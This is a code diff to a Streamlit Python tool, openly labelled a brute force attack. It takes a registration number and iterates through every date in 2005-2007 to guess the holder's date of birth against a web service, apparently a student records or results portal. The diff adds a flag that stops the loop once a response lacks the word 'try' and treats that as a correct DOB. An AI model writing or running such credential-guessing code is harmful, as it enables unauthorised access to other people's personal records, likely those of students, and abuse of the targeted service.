@@ -12,10 +12,13 @@ st.header("Starting date of birth brute force...")
 regno = st.text_input("Enter register no : ")
 
 # Define the years in the desired priority order
-years = st.multiselect("Select years to brute force", [2006, 2005, 2007], [2006, 2005, 2007])
+years = st.multiselect("Select years to brute force", [2006, 2005, 2007],[2006, 2005, 2007])
 
 # Create a container for the output
 output_container = st.empty()
+
+# Flag to stop the brute force when correct DOB is found
+found = False
 
 # Custom header
 headers = {
@@ -23,22 +26,11 @@ headers = {
 }
 
 # Check if registration number is provided
-if not regno:
-    st.error("Please enter a registration number to proceed.")
-else:
-    # Initialize progress bar
-    progress_bar = st.progress(0)
-    
-    # Initialize spinner for loading indicator
-    spinner = st.spinner("Brute forcing in progress...")
-
-    # Define total number of iterations
-    total_iterations = sum([(end_date - start_date).days for year in years
-                            for start_date, end_date in [(datetime(year, 1, 1), datetime(year, 12, 31))]])
-    current_iteration = 0
-    
+if regno:
     # Loop through each year in the specified order
     for year in years:
+        if found:
+            break
 
         # Define the start and end dates for the current year
         start_date = datetime(year, 1, 1)
@@ -47,6 +39,8 @@ else:
         # Loop through each day in the current year
         current_date = start_date
         while current_date <= end_date:
+            if found:
+                break
             
             # Format the date components with leading zeros
             date_str = current_date.strftime("%d")  # day with leading zero
@@ -67,7 +61,8 @@ else:
                 if 'try' in response.text:
                     output_message = f"Date: {date_str}/{month_str}/{year_str} - Incorrect DOB, continuing..."
                 else:
-                    output_message = f"Date: {date_str}/{month_str}/{year_str} - Correct DOB found!"
+                    output_message = f"Date: {date_str}/{month_str}/{year_str} - Correct DOB found or unexpected response!"
+                    found = True
                     output_container.text(output_message)
                     break
                 
@@ -76,20 +71,12 @@ else:
             
             # Update the output container
             output_container.text(output_message)
-            
-            # Update progress
-            current_iteration += 1
-            progress = min(1, current_iteration / total_iterations)  # Ensure progress doesn't exceed 100%
-            progress_bar.progress(progress)
 
             # Move to the next day
             current_date += timedelta(days=1)
 
-    # Ensure progress bar is filled to full once all iterations are completed
-    progress_bar.progress(1)
-
-    # Hide spinner once brute force is completed
-    spinner.empty()
-
-    # Display final output message
-    st.success("Brute force attack completed.")
+# Display final output message
+if found and regno:
+    st.success("Brute force attack successful!")
+elif regno:
+    st.error("Brute force attack unsuccessful.")
